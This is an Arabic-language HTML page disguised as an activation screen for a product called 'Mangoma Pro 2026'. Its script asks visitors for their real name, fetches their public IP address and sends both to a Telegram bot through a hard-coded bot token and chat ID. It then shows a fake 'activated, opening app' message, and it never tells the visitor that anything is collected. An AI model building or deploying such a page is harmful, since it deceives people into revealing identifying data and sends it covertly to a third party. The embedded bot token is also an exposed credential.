<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل المنظومة</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: Tahoma; text-align: center; padding: 20px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; text-align: center; }
        button { width: 95%; padding: 10px; background: #0f0; font-weight: bold; cursor: pointer; }
        .hidden { display: none; }
    </style>
</head>
<body>

    <div id="loginBox">
        <h2>🔐 Mangoma Pro 2026</h2>
        <p>يجب تفعيل النسخة أولاً</p>
        <input type="text" id="username" placeholder="اكتب اسمك الحقيقي...">
        <button onclick="start()" id="btn">تفعيل ودخول</button>
        <p id="msg" style="color:yellow; margin-top:5px;"></p>
    </div>

    <div id="appBox" class="hidden">
        <h2>✅ تم التفعيل</h2>
        <p>الاسم: <span id="finalName"></span></p>
        <hr>
        <h3>جاري فتح التطبيق...</h3>
    </div>

<script>
    // بياناتك اللي انت جربتها واشتغلت
    const BOT = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
    const CHAT = "-1003886528114";

    function start() {
        const name = document.getElementById("username").value;
        if(name.length < 3) { alert("اكتب الاسم!"); return; }

        document.getElementById("btn").disabled = true;
        document.getElementById("msg").innerText = "جاري الاتصال بالسيرفر...";

        // 1. نجيب الاي بي
        fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            send(name, data.ip);
        })
        .catch(e => {
            send(name, "IP غير معروف");
        });
    }

    function send(name, ip) {
        // رسالة التليجرام
        const txt = `🔥 *تسجيل دخول جديد*\n👤 الاسم: ${name}\n🌐 IP: ${ip}`;
        const url = `https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`;

        // ارسال مباشر
        fetch(url).then(r => {
            document.getElementById("loginBox").classList.add("hidden");
            document.getElementById("appBox").classList.remove("hidden");
            document.getElementById("finalName").innerText = name;
        }).catch(e => {
            // حتى لو حصل خطأ في الشبكة هندخله عشان ميزهقش
            document.getElementById("loginBox").classList.add("hidden");
            document.getElementById("appBox").classList.remove("hidden");
        });
    }
</script>
</body>
</html>
